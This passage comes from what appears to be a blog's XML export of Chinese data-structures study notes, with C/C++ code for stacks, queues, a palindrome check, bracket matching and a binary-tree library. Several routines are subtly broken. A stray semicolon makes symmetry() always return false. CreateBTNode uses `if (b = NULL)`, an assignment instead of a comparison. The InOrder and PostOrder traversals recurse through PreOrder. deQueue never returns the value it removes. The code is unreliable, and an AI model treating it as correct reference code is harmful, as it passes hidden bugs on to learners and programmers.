class="number">0</span>; i--) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, s-&gt;data[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例题-3-4-对称串"><a href="#例题-3-4-对称串" class="headerlink" title="例题 3.4 对称串"></a>例题 3.4 对称串</h3><p>[例3.4]设计一个算法利用顺序栈判断一个字符串是否为对称串。所谓对称串指从左向右读和从右向左读的序列相同。<br>解：n个元素连续进栈，产生的连续出栈序列和输人序列正好相反，本算法就是利用这个特点设计的。对于字符串str，从头到尾将其所有元素连<br>续进栈，如果所有元素连续出栈产生的序列和从头到尾的字符依次相同，表示str是一个对称串，返回真；否则表示str不是对称串，返回假。<br>算法如下:</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*字符串是否对称*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">symmetry</span><span class="params">(ElemType str[])</span> </span>&#123;</span><br><span class="line">	ElemType e;</span><br><span class="line">	SqStack* st;</span><br><span class="line">	<span class="built_in">InitStack</span>(st);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i]!=<span class="string">&#x27;\0&#x27;</span>;i++) &#123;</span><br><span class="line">		<span class="built_in">Push</span>(st,str[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; str[i] != <span class="string">&#x27;\0&#x27;</span>;i++) &#123;</span><br><span class="line">		<span class="built_in">Pop</span>(st,e);<span class="comment">//出栈，相当于逆序</span></span><br><span class="line">		<span class="keyword">if</span> (str[i] != e); &#123;<span class="comment">//顺序!=逆序</span></span><br><span class="line">			<span class="built_in">DestroyStack</span>(st);</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">DestroyStack</span>(st);</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-1-3-链栈"><a href="#3-1-3-链栈" class="headerlink" title="3.1.3 链栈"></a>3.1.3 链栈</h2><h3 id="算法库：-1"><a href="#算法库：-1" class="headerlink" title="算法库："></a>算法库：</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">auto</span> MaxSize = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">linknode</span> &#123;</span><br><span class="line">	ElemType data;</span><br><span class="line">	<span class="keyword">struct</span> <span class="title class_">linknode</span>* next;</span><br><span class="line">&#125;LinkStNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*初始化*/</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitStack</span><span class="params">(LinkStNode*&amp; s)</span> </span>&#123;</span><br><span class="line">	s = (LinkStNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LinkStNode));</span><br><span class="line">	s-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyStack</span><span class="params">(LinkStNode*&amp; s)</span> </span>&#123;</span><br><span class="line">	LinkStNode* p = s-&gt;next,*pre=s; <span class="comment">//pre指向头节点，p指向首节点</span></span><br><span class="line">	<span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">free</span>(pre);		<span class="comment">//释放pre节点</span></span><br><span class="line">		pre = p;		<span class="comment">//pre、p同步后移</span></span><br><span class="line">		p = pre-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">free</span>(pre);	<span class="comment">//此时pre指向位置在，是放其空间</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackLength</span><span class="params">(LinkStNode* s)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">	LinkStNode* p;</span><br><span class="line">	p = s-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		i++;</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">StackEmpty</span><span class="params">(LinkStNode* s)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> s-&gt;next == <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">Push</span><span class="params">(LinkStNode*&amp; s, ElemType e)</span> </span>&#123;</span><br><span class="line">	LinkStNode* p;</span><br><span class="line">	p = (LinkStNode*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(LinkStNode));</span><br><span class="line">	p-&gt;data = e;</span><br><span class="line">	p-&gt;next = s-&gt;next;		<span class="comment">//插入p，作为首节点</span></span><br><span class="line">	s-&gt;next = p;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">Pop</span><span class="params">(LinkStNode*&amp; s, ElemType&amp; e)</span> </span>&#123;</span><br><span class="line">	LinkStNode* p;</span><br><span class="line">	<span class="keyword">if</span> (s-&gt;next == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	p = s-&gt;next;</span><br><span class="line">	e = p-&gt;data;</span><br><span class="line">	s-&gt;next = p-&gt;next;</span><br><span class="line">	<span class="built_in">free</span>(p);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">GetTop</span><span class="params">(LinkStNode*&amp; s, ElemType&amp; e)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (s-&gt;next == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">	e = s-&gt;next-&gt;data;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DispStack</span><span class="params">(LinkStNode* s)</span> </span>&#123;</span><br><span class="line">	LinkStNode* p = s-&gt;next;</span><br><span class="line">	<span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, p-&gt;data);</span><br><span class="line">		p = p-&gt;next;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="例题-3-5-括号匹配"><a href="#例题-3-5-括号匹配" class="headerlink" title="例题 3.5 括号匹配"></a>例题 3.5 括号匹配</h3><p>[例3.5]设计一个算法判断输人的表达式中括号是否配对（假设只含有左、右圆括号）。<br>解：该算法在表达式括号配对时返回真，否则返回假。设置一个链栈st，扫描表达式exp，遇到左括号时进栈；遇到右括号时，若栈顶为左括号，则出栈，否则返回假。当表达式扫描完毕而且栈为空时返回真；否则返回假。<br>算法如下：</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">Match</span><span class="params">(<span class="type">char</span> exp[],<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> i = <span class="number">0</span>; <span class="type">char</span> e;</span><br><span class="line">	<span class="type">bool</span> match = <span class="literal">true</span>;</span><br><span class="line">	LinkStNode* st;</span><br><span class="line">	<span class="built_in">InitStack</span>(st);</span><br><span class="line">	<span class="keyword">while</span>(i&lt;n &amp;&amp; match) &#123;</span><br><span class="line">		<span class="keyword">if</span> (exp[i] == <span class="string">&#x27;(&#x27;</span>)<span class="built_in">Push</span>(st, exp[i]);<span class="comment">//左括号，入栈</span></span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span> (exp[i] == <span class="string">&#x27;)&#x27;</span>)<span class="comment">//右括号</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span> (<span class="built_in">GetTop</span>(st, e) == <span class="literal">true</span>) &#123;<span class="comment">//得到栈顶元素</span></span><br><span class="line">				<span class="keyword">if</span> (e != <span class="string">&#x27;(&#x27;</span>)match = <span class="literal">false</span>;<span class="comment">//如果栈顶不成匹配，false</span></span><br><span class="line">				<span class="keyword">else</span> <span class="built_in">Pop</span>(st, e);<span class="comment">//匹配成功就出栈</span></span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> match = <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span> (!<span class="built_in">StackEmpty</span>(st))match = <span class="literal">false</span>;<span class="comment">//如果还有（，表示括号不成对，失败！</span></span><br><span class="line">	<span class="built_in">DestroyStack</span>(st);</span><br><span class="line">	<span class="keyword">return</span> match;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="3-2-队列"><a href="#3-2-队列" class="headerlink" title="3.2 队列"></a>3.2 队列</h2><h3 id="1、顺序队-算法库"><a href="#1、顺序队-算法库" class="headerlink" title="1、顺序队-算法库"></a>1、顺序队-算法库</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="type">int</span> ElemType;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="keyword">auto</span> MaxSize = <span class="number">100</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">	ElemType data[MaxSize];</span><br><span class="line">	<span class="type">int</span> front, rear;</span><br><span class="line">&#125;SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitQueue</span><span class="params">(SqQueue *&amp;q)</span> </span>&#123;</span><br><span class="line">	q = (SqQueue*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SqQueue));</span><br><span class="line">	q-&gt;front = q-&gt;rear = <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyQueue</span><span class="params">(SqQueue *&amp;q)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">free</span>(q);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">QueueEmpty</span><span class="params">(SqQueue *&amp;q)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> q-&gt;front == q-&gt;rear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*入栈*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">enQueue</span><span class="params">(SqQueue *&amp;q,ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (q-&gt;rear == MaxSize - <span class="number">1</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	q-&gt;rear++;</span><br><span class="line">	q-&gt;data[q-&gt;rear] = e;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*出栈*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">deQueue</span><span class="params">(SqQueue*&amp; q, ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (q-&gt;front == q-&gt;rear)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	q-&gt;front++;</span><br><span class="line">	e = q-&gt;data[q-&gt;front];</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="2、环形队-算法库"><a href="#2、环形队-算法库" class="headerlink" title="2、环形队-算法库"></a>2、环形队-算法库</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> &#123;</span><br><span class="line">	ElemType data[MaxSize];</span><br><span class="line">	<span class="type">int</span> front, rear;</span><br><span class="line">&#125;SqQueue;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">InitQueue</span><span class="params">(SqQueue *&amp;q)</span> </span>&#123;</span><br><span class="line">	q = (SqQueue*)<span class="built_in">malloc</span>(<span class="built_in">sizeof</span>(SqQueue));</span><br><span class="line">	q-&gt;front = q-&gt;rear = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">DestroyQueue</span><span class="params">(SqQueue *&amp;q)</span> </span>&#123;</span><br><span class="line">	<span class="built_in">free</span>(q);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">QueueEmpty</span><span class="params">(SqQueue *&amp;q)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> q-&gt;front == q-&gt;rear;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*入栈*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">enQueue</span><span class="params">(SqQueue *&amp;q,ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> ((q-&gt;rear+<span class="number">1</span>)%MaxSize == q-&gt;front)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	q-&gt;rear=(q-&gt;rear+<span class="number">1</span>)%MaxSize;</span><br><span class="line">	q-&gt;data[q-&gt;rear] = e;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*出栈*/</span></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">deQueue</span><span class="params">(SqQueue*&amp; q, ElemType e)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (q-&gt;front == q-&gt;rear)<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	q-&gt;front=(q-&gt;front+<span class="number">1</span>)%MaxSize;</span><br><span class="line">	e = q-&gt;data[q-&gt;front];</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>C++</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>07第七章、树和二叉树</title>
    <url>/2021/05/15/07%E7%AC%AC%E4%B8%83%E7%AB%A0%E3%80%81%E6%A0%91%E5%92%8C%E4%BA%8C%E5%8F%89%E6%A0%91/</url>
    <content><![CDATA[<h1 id="第七章、树和二叉树"><a href="#第七章、树和二叉树" class="headerlink" title="第七章、树和二叉树"></a>第七章、树和二叉树</h1><h2 id="7-3-2-二叉树链式存储"><a href="#7-3-2-二叉树链式存储" class="headerlink" title="7.3.2 二叉树链式存储"></a>7.3.2 二叉树链式存储</h2><h3 id="算法库："><a href="#算法库：" class="headerlink" title="算法库："></a>算法库：</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stack&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unordered_map&gt;</span></span></span><br><span class="line">using namespace <span class="built_in">std</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> <span class="keyword">warning</span>(disable:4996)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="type">char</span> ElemType;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MaxSize 100</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span>&#123;</span></span><br><span class="line">	ElemType data;    <span class="comment">//数据元素</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">lchild</span>;</span>  <span class="comment">//指向左孩子</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">rchild</span>;</span>  <span class="comment">//指向右孩子</span></span><br><span class="line">&#125;BTNode;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*创建二叉树*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">CreateBTNode</span><span class="params">(BTNode *&amp; b,<span class="type">char</span> *str)</span> &#123;</span><br><span class="line">	BTNode* St[MaxSize], * p=<span class="literal">NULL</span>;  <span class="comment">//St数组作为顺序栈</span></span><br><span class="line">	<span class="type">int</span> top = <span class="number">-1</span>, k, j = <span class="number">0</span>;	   <span class="comment">//top为栈顶指针</span></span><br><span class="line">	<span class="type">char</span> ch;</span><br><span class="line">	b = <span class="literal">NULL</span>;					<span class="comment">//初始时二叉链为空</span></span><br><span class="line">	ch = str[j];</span><br><span class="line">	<span class="keyword">while</span> (ch!=<span class="string">&#x27;\0&#x27;</span>)			<span class="comment">//循坏扫描str中的每个字符</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">switch</span> (ch) &#123;</span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:top++; St[top] = p; k = <span class="number">1</span>; <span class="keyword">break</span>; <span class="comment">//开始处理左孩子节点</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:top--; <span class="keyword">break</span>;  <span class="comment">//栈顶节点的子树处理完毕</span></span><br><span class="line">		<span class="keyword">case</span> <span class="string">&#x27;,&#x27;</span>:k = <span class="number">2</span>; <span class="keyword">break</span>;  <span class="comment">//开始处理右孩子节点</span></span><br><span class="line">		<span class="keyword">default</span>:p = (BTNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(BTNode)); <span class="comment">//创建一个节点，由p指向它</span></span><br><span class="line">			p-&gt;data = ch;   <span class="comment">//存放节点值</span></span><br><span class="line">			p-&gt;lchild = p-&gt;rchild = <span class="literal">NULL</span>;  <span class="comment">//左右指针都设置空</span></span><br><span class="line">			<span class="keyword">if</span> (b = <span class="literal">NULL</span>)b = p;  <span class="comment">//弱国没有建根，则p所指为根</span></span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				<span class="keyword">switch</span> (k)</span><br><span class="line">				&#123;</span><br><span class="line">				<span class="keyword">case</span> <span class="number">1</span>:St[top]-&gt;lchild = p; <span class="keyword">break</span>; <span class="comment">//新建节点作为栈顶节点的左孩子</span></span><br><span class="line">				<span class="keyword">case</span> <span class="number">2</span>:St[top]-&gt;rchild = p; <span class="keyword">break</span>; <span class="comment">//新建节点作为栈顶指针的右孩子</span></span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		j++;		<span class="comment">//继续扫描str</span></span><br><span class="line">		ch = str[j];</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*查找节点*/</span></span><br><span class="line">BTNode* <span class="title function_">FindNode</span><span class="params">(BTNode* b, ElemType x)</span>  <span class="comment">//返回data域为x的节点指针</span></span><br><span class="line">&#123;</span><br><span class="line">    BTNode* p;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (b-&gt;data == x)</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        p = FindNode(b-&gt;lchild, x);</span><br><span class="line">        <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">return</span> FindNode(b-&gt;rchild, x);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*左孩子*/</span></span><br><span class="line">BTNode* <span class="title function_">LchildNode</span><span class="params">(BTNode* p)</span>   <span class="comment">//返回*p节点的左孩子节点指针</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> p-&gt;lchild;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*右孩子*/</span></span><br><span class="line">BTNode* <span class="title function_">RchildNode</span><span class="params">(BTNode* p)</span>   <span class="comment">//返回*p节点的右孩子节点指针</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> p-&gt;rchild;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*二叉树深度*/</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">BTNodeDepth</span><span class="params">(BTNode* b)</span>  <span class="comment">//求二叉树b的深度</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> lchilddep, rchilddep;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="literal">NULL</span>)</span><br><span class="line">        <span class="keyword">return</span>(<span class="number">0</span>);                          <span class="comment">//空树的高度为0</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        lchilddep = BTNodeDepth(b-&gt;lchild);   <span class="comment">//求左子树的高度为lchilddep</span></span><br><span class="line">        rchilddep = BTNodeDepth(b-&gt;rchild);   <span class="comment">//求右子树的高度为rchilddep</span></span><br><span class="line">        <span class="keyword">return</span> (lchilddep &gt; rchilddep) ? (lchilddep + <span class="number">1</span>) : (rchilddep + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*输出二叉树*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DispBTNode</span><span class="params">(BTNode* b)</span>  <span class="comment">//以括号表示法输出二叉树</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (b != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, b-&gt;data);</span><br><span class="line">        <span class="keyword">if</span> (b-&gt;lchild != <span class="literal">NULL</span> || b-&gt;rchild != <span class="literal">NULL</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;(&quot;</span>);</span><br><span class="line">            DispBTNode(b-&gt;lchild);</span><br><span class="line">            <span class="keyword">if</span> (b-&gt;rchild != <span class="literal">NULL</span>) <span class="built_in">printf</span>(<span class="string">&quot;,&quot;</span>);</span><br><span class="line">            DispBTNode(b-&gt;rchild);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;)&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*销毁二叉树*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">DestroyBTNode</span><span class="params">(BTNode*&amp; b)</span>   <span class="comment">//销毁二叉树</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span> (b != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        DestroyBTNode(b-&gt;lchild);</span><br><span class="line">        DestroyBTNode(b-&gt;rchild);</span><br><span class="line">        <span class="built_in">free</span>(b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//先序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PreOrder</span><span class="params">(BTNode* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (b != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, b-&gt;data);</span><br><span class="line">        PreOrder(b-&gt;lchild);</span><br><span class="line">        PreOrder(b-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 中序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">InOrder</span><span class="params">(BTNode* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (b != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        PreOrder(b-&gt;lchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, b-&gt;data);</span><br><span class="line">        PreOrder(b-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//后序遍历</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">PostOrder</span><span class="params">(BTNode* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (b != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        PreOrder(b-&gt;lchild);</span><br><span class="line">        PreOrder(b-&gt;rchild);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, b-&gt;data);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*层次遍历，队列*/</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">LevelOrder</span><span class="params">(BTNode* b)</span> &#123;</span><br><span class="line">    BTNode* p;</span><br><span class="line">    <span class="built_in">queue</span>&lt;BTNode*&gt; myQueue; <span class="comment">//定义</span></span><br><span class="line">    myQueue.push(b);  <span class="comment">//根节点入队</span></span><br><span class="line">    <span class="keyword">while</span> (!myQueue.empty())</span><br><span class="line">    &#123;	<span class="comment">//取得头元素</span></span><br><span class="line">        p = myQueue.front(); myQueue.pop();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c &quot;</span>, p-&gt;data);</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;lchild != <span class="literal">NULL</span>)  <span class="comment">//加入左孩子</span></span><br><span class="line">            myQueue.push(p-&gt;lchild);</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;rchild != <span class="literal">NULL</span>)  <span class="comment">//加入右孩子</span></span><br><span class="line">            myQueue.push(p-&gt;rchild);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//判断是否是完全二叉树</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">IsComplete</span><span class="params">(BTNode* b)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (b == <span class="literal">NULL</span>)<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    <span class="type">bool</span> leaf = <span class="literal">false</span>;</span><br><span class="line">    <span class="built_in">queue</span>&lt;BTNode*&gt;q;</span><br><span class="line">    q.push(b);</span><br><span class="line">    <span class="keyword">while</span> (!q.empty()) &#123;</span><br><span class="line">        BTNode* p = q.front();</span><br><span class="line">        q.pop();</span><br><span class="line">        <span class="keyword">if</span> ((leaf &amp;&amp; (p-&gt;lchild != <span class="literal">NULL</span> || p-&gt;rchild != <span class="literal">NULL</span>)) || (p-&gt;lchild == <span class="literal">NULL</span> &amp;&amp; p-&gt;rchild != <span class="literal">NULL</span>))<span class="comment">//这些判断条件是所有的不满足是完全二叉树的条件。条件一（第二个||前面的条件）：上述的状态已经发生，但是当前访问到的节点不是叶节点（有左孩子或者右孩子）。条件二：当前节点有右孩子，没有左孩子</span></span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;lchild != <span class="literal">NULL</span>)<span class="comment">//左孩子不为空，加入到队列中去</span></span><br><span class="line">            q.push(p-&gt;lchild);</span><br><span class="line">        <span class="keyword">if</span> (p-&gt;rchild != <span class="literal">NULL</span>)<span class="comment">//右孩子不为空，加入到队列中去</span></span><br><span class="line">            q.push(p-&gt;rchild);</span><br><span class="line">        <span class="keyword">if</span> ((p-&gt;lchild != <span class="literal">NULL</span> &amp;&amp; p-&gt;rchild == <span class="literal">NULL</span>) || (p-&gt;lchild == <span class="literal">NULL</span> &amp;&amp; p-&gt;rchild == <span class="literal">NULL</span>))<span class="comment">//这个if语句就是判断状态是否要发生</span></span><br><span class="line">            leaf = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//翻转二叉树</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">invertTree</span><span class="params">(BTNode* b)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (b == <span class="literal">NULL</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    BTNode* temp = b-&gt;lchild;   <span class="comment">//左右节点交换</span></span><br><span class="line">    b-&gt;lchild = b-&gt;rchild;</span><br><span class="line">    b-&gt;rchild = temp;</span><br><span class="line"></span><br><span class="line">    invertTree(b-&gt;lchild);      <span 